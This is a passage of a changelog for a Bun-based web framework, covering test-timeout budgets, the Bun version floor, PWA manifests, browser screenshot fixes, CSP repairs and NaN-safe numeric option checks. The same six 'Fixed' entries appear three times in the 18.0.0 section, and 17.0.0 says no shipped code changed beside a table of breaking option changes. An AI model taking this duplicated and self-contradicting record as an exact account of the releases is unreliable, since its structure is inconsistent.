  is 90s → **180s**, and the six newest whole-tree scanners — `config-readers`, `frozen-records`,
  `node-imports`, `flight-copies`, `sql-literal-copies`, `framework-tables` — joined the convention
  they had never heard of, having run on Bun's 5,000 ms default since they were written. A ~1.3x
  slower runtime turned all 21 red at once, every one a timeout and none a wrong answer;
  `scripts/verify.test.ts` runs in **12.5 s alone** and did not finish inside 90 s under
  `--parallel=8`, so the budget had never been sized against contention. A free `ubuntu-latest`
  runner varies by more than 1.3x on its own.

  `packages/cli`'s three framework-scan budgets moved with it — `cmd-mcp.test.ts`,
  `error-catalog.test.ts`, `cmd-errors.test.ts` — and they were the worse half: each carries the
  number as a **literal**, because a published package's suite may not import the host monorepo's
  `scripts/`, and each says in a comment that the literal mirrors `REPO_SCAN_TIMEOUT_MS`. They read
  `30_000` while the constant read `90_000`. A mirror nothing compares is a wish, so
  `scripts/repo-scan-timeout.test.ts` compares them now and the drift is a build error.

  That new rule is the other half: a `scripts/` test that calls `repoRoot()` declares the budget, in
  one of the two legal forms, or the gate fails. Pinned at **zero** — the sweep landed first, 39
  files. A first draft asked whether the source merely *named* the constant and could not fail,
  every enrolled file naming it in the comment above the call; it matches the call and the third
  argument as code now, proved by mutation on both forms.

### Changed

- **`@types/bun` is pinned exactly.** It was `^1.4.0` — the only Bun pin in the repository that was
  a range, where the rule is "no `^`, no `~`". It decides which Bun API surface `bun run typecheck`
  believes in, so a range here is the runtime-floor defect one layer up: the step whose whole job is
  catching a call the runtime cannot answer, type-checking against a Bun nobody pinned.
  `scripts/bun-pin.test.ts` reads it as a site now.

### Not changed, and the evidence for why

- **The Bun floor stays `>=1.4.0`.** Lowering it to the 1.3 series was tried in full and refused on
  measurement, not on paperwork. The argument for lowering is good and will be made again:
  `--isolate` and `--parallel` are **1.3.13** features, nothing here calls a 1.4-only API
  (`bun run typecheck` is clean against `@types/bun@1.3.14`), so `>=1.4.0` bars every Bun 1.3 user
  for a capability the framework does not use. Two of the three arguments that put CI on 1.4 in the
  first place do not survive re-reading either — the `--compile` bundling skew is closed by
  `COMPILE_EXTERNALS` on either Bun, and "dev boxes and CI must agree" is satisfied by agreeing on
  1.3 just as well.

  What refused it, for now: a shutdown hang. `packages/cli/src/dev-runtime.live.test.ts` drops the
  probe database out from under a running web role and the teardown never returns on 1.3.14, against
  green on 1.4.0 — reproduced twice on CI and repeatedly locally.

  **The mechanism is not the version.** Reduced to a repro with no `@ultimat3/*` and run three times
  per case ([#394](https://github.com/developerz-ai/ultimate/issues/394)): `Bun.SQL`'s `end()` waits
  on an outstanding **reserved** connection, identically on both runtimes. The divergence appears
  only once that connection's backend has been terminated, and there it is a **race** — 1.3.14 hangs
  3 of 3, 1.4.0 hangs 1 of 3. 1.4.0 is lucky, not correct, and the same hang is latent in what ships
  today. The repair is therefore probably ours — `releaseQueue` awaits `db.close()` with a reserve
  outstanding — and fixing it likely makes the 1.3 floor admissible.

  Also measured, and recorded so the next attempt need not re-derive it: the whole gate is green on
  1.3.14 once the budgets above are fixed, at **337s against 144s on 1.4.0** (`unit` 230s against
  64s), and CI's `verify` job ran **6m14s** on 1.3.x against 3m36s — past the five-minute target.
  `oven/bun:1.3-slim` is trixie / glibc 2.41, the same pair the distroless runtime stage needs, and
  the image rebuilds on it and answers `--version` (104MB binary, 197MB image).
  `Intl.supportedValuesOf('timeZone')` lists 445 zones on both, and
  `new Intl.DateTimeFormat('en', { timeZone: 'CET' })` throws on 1.3.14 where 1.4.0 resolves it —
  which `isIanaZoneName` never sees, being structural. The full record is in
  [`.github/actions/setup/action.yml`](.github/actions/setup/action.yml).

### Commits

- feat(cli,core,pwa): a build that emits the service worker, and a real browser that proves it offline (#401)
- feat(cli): a real browser behind installE2eDriver, over raw CDP, with no dependency (#400)
- fix(build): anchor the three registrations the sideEffects array never kept (#399)
- fix(db): bound the drain, and give back the pin the pool already lost (#397)
- correct the Bun 1.3 refusal: the hang is a race both runtimes have, not a 1.3 defect (#396)
- e2e offline() forwards, and the reason it refused was never true (#395)
- the Bun 1.3 trial: a glob that read nothing, budgets sized against no contention, and the hang that refused the floor (#393)

## 18.0.0 - 2026-08-27

### Added

- **Every installable app now gets the web manifest it promised.** `x dev`, the container and
  `x build --target static` emit `manifest.webmanifest` and the `<head>` that names it —
  `<link rel="manifest">`, a `theme-color` meta per colour scheme, and every apple-touch icon link,
  on every page and in every render mode. `packages/cli/src/pwa-artifacts.ts` is the reader, and it
  is the first caller `generateWebManifest` has ever had: `pwa.enabled` was a switch nothing read
  for the whole life of the framework, so no Ultimate app has ever been installable in any browser,
  however its config was written (#362). The manifest's icon list is `planIcons`' own, the same call
  `/icons/*` serves from, so it cannot name a size nothing mints. **The service worker is still not
  wired** — `pwa.offline`, `pwa.backgroundSync`, `pwa.push` and every route's `offline:` field
  remain declarations with no build behind them; a bad `sw.js` is sticky and nothing in the gate can
  drive a real service worker, so that half lands behind a real browser check.

  The manifest names icons **only when the app committed the one source they derive from**, and
  `x build --target static` writes those bytes into the export: `planIcons` answers the same
  fourteen entries whether `apps/web/site/icon.png` exists or not, and a static host runs no
  `assetRoutes()`, so either gap turns an install prompt into twelve 404s. `examples/dummy` is
  exactly that app — `pwa.enabled: true`, no committed icon.

### Changed

- **BREAKING — the Bun floor is `>=1.4.0`, in `engines` and in the CLI's own check.** It said
  `1.3.0` at both sites while `x test` emitted `bun test --isolate`, a flag Bun introduced in
  **1.3.13** — so a user on a runtime this framework declared supported got an unknown-flag failure
  out of the gate's dominant step, and `x doctor` called the runtime fine. `--parallel` arrives from
  the same release and is emitted now. `1.4.0` rather than `1.3.13` because a floor is a claim about
  a runtime somebody tested: CI pins `1.4.x`, both images build on `oven/bun:1.4-*`, and the
  per-worker database rests on `BUN_TEST_WORKER_ID`'s numbering, probed on 1.4.0 and nothing older.
  **The edit:** `bun upgrade`. `scripts/bun-pin.test.ts` already held CI, the release job, both
  images and the contributor floor to one series and read **neither consumer-facing floor** — it now
  reads `REQUIRED_BUN` and every `engines.bun` across all 42 manifests, so the two sites that
  actually gate a user cannot drift a minor behind again.
- **`x test live` and `x test e2e` are serial, like the gate's own steps.** `verify-tests.ts` routes
  both through `runSerial`; `cmd-test.ts` never read `SERIAL_TYPES`, so `x test live --workers 8`
  spawned eight processes over the very files `x verify` ran one over — two answers to one question
  (axiom 1), and the widened one is the command a human types while debugging. The declaration is
  not a preference: a logical replication slot is named at the Postgres **cluster** level, so a
  per-worker database does not isolate it and two workers race
  `pg_create_logical_replication_slot`; `e2e` shares one built `dist/` and one browser profile.
  Neither is visible without a real `TEST_DATABASE_URL`, which is why it measured green for as long
  as it did. `--workers` is still accepted on both and clamps to 1.
- **`x test` runs one `bun test --parallel=N`, not N processes it packs itself.** Bun 1.4 runs the
  pool, so `test-shards.ts`'s largest-first bin-packer over file SIZE is deleted rather than
  improved. **This is a deletion, not a speed-up, and the measurement is why:** four interleaved
  runs of each form on the same 1296-file unit corpus, 8 workers, gave 58.2/60.0/65.0/66.5s
  hand-packed against 54.5/57.8/61.7/64.5s under `--parallel=8` — within noise. Both are already
  work-bound: `--update-timings` measures the corpus at 436.7s of file time, so eight workers
  cannot beat 54.6s however the files are dealt, and the slowest single file is 20.5s, far under
  that floor. A greedy pack of 1296 small items lands near-optimal by accident, which is why bytes
  being a poor proxy for time never showed up as a wall. What the change buys is the packer and its
  `Shard` type gone, one process instead of eight, and Bun's own summary instead of eight merged
  ones. `--timings` is refused on the same evidence — at most the ~5s between the 59.8s median and
  the 54.6s floor, against a committed JSON that goes stale on every test edit (#342). Nothing
  about isolation changed — `--parallel` implies `--isolate`, and the per-worker database is
  untouched because `@ultimat3/testing`'s `workerId` already read `BUN_TEST_WORKER_ID`, which Bun
  sets 1..N.
- **BREAKING — `x test --json` drops `data.shards[]` and `data.failed`, and four `@ultimat3/cli`
  exports are gone.** The entry above deletes the thing they described, so both surfaces follow it.
  `data.ok`, `data.exitCode` and `data.reproduce` replace the two removed fields; a gate failure is
  `X_TEST_FAILED` naming the whole type, and `X_TEST_SHARD_FAILED` is now `x test --worker I`'s
  alone — one process, so it is the only run that still has a shard to name. `planShards`,
  `shardArgs`, `SHARD_COMMAND_PREFIX` and `Shard` no longer exist; `testArgs(…)` builds the argv and
  `filesIn(command)` reads the file list back out of one. **The edit:** read `data.ok` instead of
  scanning `data.shards[]` for a failure, and `data.reproduce` instead of rebuilding the rerun.
- **BREAKING — `pwa.enabled: true` now requires `pwa.name` and `pwa.colors`.** `AppConfig.pwa`
  could not express what a web manifest needs, which is why the generator had no caller: the
  install title and the two colours per scheme are the values nothing can derive. `app.name` is a
  slug by `NAME_RE`, so an install prompt offering `ledger-demo` is the wrong answer rather than a
  rough one, and a browser paints the install splash and the address bar before a stylesheet has
  loaded, so there is no token to resolve a colour against and no defensible default. `defineConfig`
  refuses the incomplete block at boot rather than at `x build`, and the `fix:` carries the whole
  block plus `pwa.enabled: false`. **The edit:** add `name` and `colors.light`/`colors.dark`
  (`themeColor`, `backgroundColor`) to the `pwa` block of `app.config.ts`, or set
  `pwa.enabled: false`. Raw hex is legal there — one of the two places in an app it is, beside
  `theme.tokens`.
- **BREAKING — `@ultimat3/pwa` no longer exports `PwaConfig`, `ThemeTokens` or `SchemeColors`.**
  `PwaConfig` is `WebManifestInput`: two exported types of one name with no map between them is
  axiom 1, and the one that lied was this one — its doc said "the `pwa` block of `app.config.ts`"
  while `@ultimat3/core` exported the type that really is the block. `ThemeTokens` and
  `SchemeColors` are core's `PwaColors` and `PwaSchemeColors`, which they were structurally
  identical to, with nothing asserting they agreed. **The edit:** import `WebManifestInput` from
  `@ultimat3/pwa`, and `PwaColors`/`PwaSchemeColors` from `@ultimat3/core`.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **The `@ultimat3/ui` barrel-parity test flapped red on a second module, on a loaded machine.**
  `barrel-bytes.test.ts` allows Bun 1.4.0's non-deterministic drop of
  `packages/core/src/schema-error-codes.ts` and asserted the difference was **exactly** that one
  path — but the `core -> schema` edge declared in 17.0.0 means dropping it also drops
  `packages/schema/src/errors.ts`, which nothing else in a `useUi` graph reaches. Reproduced once in
  an eight-way `x test unit` shard, green on the same file run alone: this file's own documented
  load correlation, wearing a new shape. The allowance is now the flap's named FOOTPRINT rather than
  one path, so a planted extra module is still red (mutation-proved) and only the two modules that
  move together are waved through.
- **Six documentation pages promised a service-worker pipeline no build runs.** `x build` emits no
  `sw.js`, no `manifest.webmanifest` and no `<link rel="manifest">`, for any target, whatever
  `pwa.enabled` says: `generateServiceWorker`, `generateWebManifest`, `buildPrecacheManifest` and 25
  other `@ultimat3/pwa` exports have **zero callers** outside the package (#362). The pages now say
  so — `wiki/PWA-And-Offline.md` leads with it, and `wiki/Deployment.md`'s fabricated
  `✓ sw.js precache 1.9MB / 3MB` build line, `wiki/Configuration.md`'s "off means no service worker
  is generated at all", `wiki/Troubleshooting.md`'s two reserved codes and its precache-budget row,
  and the `sw.js` half of two build-ID claims are all corrected. No code changed.

### Changed

- **`core → schema` is a declared sideways edge, and five duplicated declarations are gone.**
  `CURRENCY_CODE_PATTERN`, `describeValue`, `charCount`, `SCHEMA_ERROR_CODES` and `isIanaZoneName`
  were restated in `@ultimat3/core` because both packages are tier 0 and neither could import the
  other, held equal by **394 lines of pin test in `@ultimat3/cli`** — a tier-5 package pinning a
  tier-0 invariant that no rule required to exist (#361). `describeValue` prints *instead of* a
  rejected password, so the safety property of the framework's most security-sensitive renderer
  rested on a 63-line behavioural pin at tier 5. Core imports all five now; four pin files are
  deleted. **Not breaking**: every name core exported it still exports.
- **`@ultimat3/schema` declares `sideEffects: false`**, which `bun run side-effects` had already
  measured as true of the package and which nothing had written down. It is what makes the edge
  nearly free — see below.
- **`isIanaZoneName` is exported from `@ultimat3/schema`.** Additive; `@ultimat3/core` re-exports
  the same function, so `app.config.ts` and `t.timezone` judge a zone with one predicate.
- **`schema → core` stays forbidden**, on its merits rather than by the tier rule alone: `t` is in
  every bundle graph an app has. The three copies going that way — `singleLine`, `ERROR_DOCS_URL`
  and the `Symbol.for('ultimate.error')` key — remain, and `single-line-pin.test.ts` moved from
  `@ultimat3/cli` to `packages/core/src/`, gaining assertions for the other two. `ERROR_DOCS_URL`
  had **no pin at all** and its own doc-block said so.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **A browser chunk that reaches `@ultimat3/core` no longer drags all of `@ultimat3/schema`.**
  Measured, `bun build --target=browser --minify`:

  | one import | before | edge only | edge + honest `sideEffects` |
  |---|---|---|---|
  | `UltimateError` from `core` | 6,362 B | 19,018 B | **7,352 B** |
  | `describeValue` from `core` | 7,170 B | 19,016 B | **8,160 B** |
  | `useUi` from `@ultimat3/ui` | 15,583 B | 28,284 B | **16,593 B** |
  | `moneyText` from `@ultimat3/ui` | 27,203 B | 26,838 B | **19,417 B** |

  `moneyText` always carried schema (`@ultimat3/money` puts it in the graph) and comes out
  **7.8 kB smaller**, because the duplicates are gone.

### Added

- **`page.colorScheme(scheme)` on `@ultimat3/scraping`** — what the browser reports as the user's
  OS colour preference, emulated through CDP's `prefers-color-scheme`. `ColorScheme` is
  `'light' | 'dark' | 'no-preference'`, CSS's own closed set; `no-preference` is the way back to
  the launcher's default.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`x shot --island` produced two pictures per state and delivered one.** `<state>-light.png` and
  `<state>-dark.png` came back **byte-identical**, same md5, on `examples/dummy` (#338). The
  harness set `data-theme` on the document — the OUTCOME of a theme decision — and a component
  that resolves `'system'` itself deletes or overwrites the attribute on mount, so both pictures
  fell through to `:root` and converged. Everything upstream was correct: two addresses, two
  documents, the CSS present, the dark token block present, and Chrome rendering the two URLs
  differently *pre-hydration*. `x shot` now emulates the INPUT before navigating, and keeps the
  attribute for components that read a theme they do not own.
- **The picture is the component, not the viewport it sits in.** `island-shot.ts` passed no clip
  rectangle, so every capture was the state's whole viewport — measured 720x560 for a component
  whose own box the verdict reported as 688x104. The clip is the readiness probe's box translated
  out of viewport coordinates into the page coordinates a capture is in.
- **The verdict's `blind` list claimed a limitation the tool did not have.** It read "the browser
  port takes no clip rectangle", which stopped being true when `CaptureClip` landed. A blind spot
  naming a capability is the same lie as one hiding a gap.

### Changed

- **BREAKING — `ScrapeTarget` gains `setColorScheme` and `ScrapePage` gains `colorScheme`.** Both
  are REQUIRED, for `setOfflineMode`'s reason: the asymmetry against the optional
  `CdpPageLike.emulateMediaFeatures` is what makes a driver author get a type error rather than a
  silent no-op. A third party implementing either port adds one method; every driver the framework
  ships already has it. Apps calling `page.*` are unaffected.

### Commits

- Bun owns the test pool, and a serial type is serial in both entry points (#391)
- a config that can say what an install needs, and the manifest every build now emits (#389)
- docs(pwa): say that no build emits a service worker (#388)
- refactor(core,schema): declare the edge, and stop pinning a tier-0 invariant at tier 5 (#387)
- fix(scraping,cli): a theme the component wins, and a crop the port already had (#386)
- fix(db): an array Bun does not encode, and the worker loop it silenced (#385)
- feat(notify,core,cli): the two notify tables get a sweep, and the inbox window is the app's to name (#383)
- fix(scripts): a test file is source — the Bun-only rule stops skipping it (#382)
- fix(scripts,cli): a mask that desyncs on one emoji, and a rule spelled by name (#381)
- fix(query,db,cli): a live query now declares the table it subscribes to, and drift stops reporting what a migration created (#380)
- fix(jobs,core,db): a sleep that never ends, a locale echoed into a log, and a URL that opened a pool on the wrong engine (#379)

## 17.0.0 - 2026-08-26

One sweep, in tier order, against a single defect class: **a numeric bound whose own non-finite
value makes its guard read false.** `??` guards *nullish*, and `NaN` is not nullish — so
`Number(process.env.X)` on an unset variable, a `parseInt` of a typo and an untyped config value all
walk past the default and land on the bound intact. `Math.max`, `Math.min` and `Math.floor` are not
validators either: all three **propagate** `NaN`, and this repo was relying on all three as guards.

| Shape | What actually happens |
|---|---|
| `value > limit` | false for **every** input — the limit stops being enforced rather than enforced wrongly |
| `Array.from({ length: NaN })`, `slice(0, NaN)` | `[]` — zero workers spawned, reported as success |
| `setTimeout(fn, NaN)` | `setTimeout(fn, 0)` — a poll becomes a spin |
| `while (n < limit)` | never terminates, synchronously, past every `AbortSignal` |

### Added

- **`finiteOption()` and `finiteCount()` in `@ultimat3/core`**, at tier 0, so every tier above
  reaches one check. Four private copies had grown before they were collapsed — `jobs`, `realtime`,
  `query`, and `@ultimat3/storage`'s `assertFiniteSignedUrlBound`, deleted after confirming
  `finiteCount`'s predicate is byte-identical to it, so no tier-0 widening was needed.
- **`bun run finite-bounds`** — a step of the gate's `unit` check, standalone. Every `a.b ?? <number>`
  in `packages/*/src` needs a finite check on the same value, or a pinned count. It ships **with**
  the sweep and not after it, because three files documented it before it existed and a doc
  promising a command that does not exist is what axiom 3 forbids. A ratchet: 129 sites across 19
  packages on day one, falling as each slice lands, and `X_FINITE_BOUND_PIN_STALE` fires the moment
  a slice repairs a package and leaves its row behind.

  It matches on the **shape** and has been widened twice by defects that walked past it, both on
  2026-08-26: an optional chain on the *object* (`options?.ttlMs ?? C`, which is
  `auth/src/oauth-cookie.ts`'s handshake TTL) and a default read out of a **table** of numbers
  (`?? DEFAULT_VERIFICATION_TTL_MS[input.purpose]`, `auth/src/verify.ts`). Each sat behind a green
  ratchet and a `CLAUDE.md` sentence claiming that package's numbers were screened.
- **`X_CACHE_LIMIT_INVALID`** — a tier's ceiling, duration or similarity floor refused at
  **construction** rather than on the first write.
- **`X_TRUST_PROXY_UNSET`** and `assertClaimBounds` (`@ultimat3/jobs`), exported.
- **No shipped code changed.** This sweep adds codes and removes none.

### Changed

- **BREAKING — every numeric option below refuses a value it used to accept.** The accepted domain
  narrows to *finite*, and in most cases to *whole* and *non-negative*; the refusal is at the option
  boundary, with a `fix:` naming the option and its domain. An app passing a real number is
  unaffected. An app that was passing `NaN` was not working — the bound it declared was not being
  enforced, and nothing said so.

  | Package | Options |
  |---|---|
  | `@ultimat3/http` | `port` (`0…65535`, whole), `bodyLimitBytes`, `requestTimeoutMs`, `maxInflight`, `drainTimeoutMs` (whole, `≥ 0`; `null` still declines the drain), `memoryRateLimitStore({ maxKeys })` (`≥ 1`), `verifyWebhookSignature({ maxBytes })` (`≥ 1`) |
  | `@ultimat3/query` | `search()`'s `page.max`, `page.default`, `termMax`; `cache.ttlMs` |
  | `@ultimat3/jobs` | `createLimiter`'s five options; `JobDriver.claim`, `introspect.list` and `deadLetters` limits |
  | `@ultimat3/realtime` | `maxPerTenant`, `maxReconnectAttempts`, `maxPerSocket` and four socket ceilings — the five now refused at **boot** rather than per-frame; `createMemoryEventBus` / `createPgEventBus` `defaultTtl` |
  | `@ultimat3/auth` | `HandshakeSealOptions.ttlMs`, `IssueVerificationInput.ttlMs`, `SessionCookieOptions.maxAgeSeconds` (negatives and fractions newly refused), `KdfLimits.maxConcurrent` and `maxQueued` |
  | `@ultimat3/ai` | `llm`/`agent`/`defineEval`/`llmJudge`/`gateway` `maxTokens`, `agent` `maxTurns` and `maxToolResultChars`, `createGateway` `retry.attempts`, `RemoteEmbedder` `batchSize`/`timeoutMs`/`dimension`, `HashEmbedder.dimension`, `embedBatched` size, `registerModel` `contextWindow`/`maxOutput` (whole ≥ 1); `budget.tokensIn`/`tokensPerRun`, `BudgetLimits`, `hive` `concurrency`/`minMembers`, `retrieve` k, `assembleContext` `maxTokens`, vector `k`/`candidates`, `registerModel` `cacheMinimumTokens` and both prices' `minor` (whole ≥ 0); `chunk` `size`/`overlap`, `k1`, `b`, `rrfK` (finite, fractions still allowed) |
  | `@ultimat3/render` | `renderSsr` and `streamResult` `status` (whole, 200–599), `holeTimeoutMs`, `render-isr` `maxEntries`, `themeScript` `maxBytes`, `registerRoute` `suspenseBoundaries` |
  | `@ultimat3/pwa` | `minEngagementMs`, `warnBytes`, each precache entry's own `bytes`, `retentionPlan` `keep` |
  | `@ultimat3/mail` | `driver-resend` and `driver-smtp` `timeoutMs` (whole ≥ 1 — both hand the value straight to `AbortSignal.timeout`, so `0` aborts on the next tick and is not "no deadline") |
  | `@ultimat3/manifest` | `checkAgentsMd` `maxBytes` |
  | `@ultimat3/mcp` | `serveStdio` `lineLimitBytes` (whole ≥ 1), `mcpHttpRoute` `bodyLimitBytes` (now refused at **construction**, not on the first request), `capQueryRows` `maxRows`/`maxBytes` |
  | `@ultimat3/notify` | `createMemoryDeliveryLedger` `max`, `InboxQuery.limit` (both drivers), `notifier` `maxRecipients`, `deliver[].wait` and `deliver[].digest.window` |
  | `@ultimat3/ui` | `DataTable` `skeletonRows`, `Skeleton` `lines`, `filterOptions` limit |
  | `@ultimat3/scraping` | `scrape` `pageTimeout`/`rate`/`watchdog.idleMs`/`auth.maxAge`/`expect.{minRows,maxDrop,window}`, `localBrowser` `graceMs`, `page.waitFor` `timeout`, `awaitActionable` `pollMs`, `http.request` `timeout`/`maxBytes`, `robotsFetcher` `timeoutMs`/`maxBytes`, `fakePage` `timeoutMs`, `deadline(clock, totalMs)` |
  | `@ultimat3/testing` | `installDeterminism` `now`/`seed`, `setFrozenClock`, `frozenClock`, `advanceClock` |
  | `@ultimat3/cli` | `syncAuthenticator` `ttlMs`, `installE2eDriver` `timeoutMs`/`serviceWorkerTimeoutMs`, `createTraceRecorder` `limit`, `runIslandShot` `minBytes`, `startMetricsEndpoint` `port` |
  | `@ultimat3/admin` | `memoryAuditLog` `capacity`, `AuditLog.entries` `limit`, `adminSearch` `limitPerResource`, `adminResource` `pageSize` |
  | `@ultimat3/core` (blind-spot slice) | `configureLifecycle` `deadlineMs` (whole ≥ 0), `nanoid` `length`, `randomHex` `byteLength` (whole ≥ 1) |
